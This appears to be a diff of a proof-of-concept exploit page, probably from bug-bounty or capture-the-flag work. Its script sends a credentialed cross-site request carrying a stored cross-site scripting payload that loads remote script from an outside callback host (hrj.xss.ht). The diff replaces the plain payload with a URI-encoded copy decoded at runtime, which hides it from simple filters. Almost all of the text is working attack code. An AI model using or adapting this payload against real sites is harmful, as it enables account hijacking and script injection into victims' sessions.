@@ -13,8 +13,9 @@ function sendMessage(msg) {
   fetch(url, {headers: csrf_header, credentials: 'include'});
 }
  
-sendMessage("let me rename you"); 
-sendMessage('"><script src=https://hrj.xss.ht></script>');
+sendMessage("let me rename you");
+var a= decodeURI('%22%3E%3Cscript%20src=https://hrj.xss.ht%3E%3C/script%3E');
+sendMessage(a);
 </script>
 </body>
 </html>
